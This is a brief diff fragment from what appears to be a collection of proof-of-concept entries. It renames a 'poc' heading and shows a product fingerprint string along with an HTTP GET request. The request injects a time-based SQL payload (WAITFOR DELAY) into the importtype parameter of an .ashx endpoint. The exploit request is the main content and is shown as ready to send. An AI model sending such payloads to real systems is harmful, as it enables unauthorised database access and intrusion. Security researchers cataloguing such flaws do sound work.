@@ -6,7 +6,7 @@
 body="custom/blue/uimaker/easyui.css"
 ```
 
-## poc
+## POC
 
 ```plain
 GET /ashx/KQ/SExcelExpErr.ashx?action=list&importtype=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
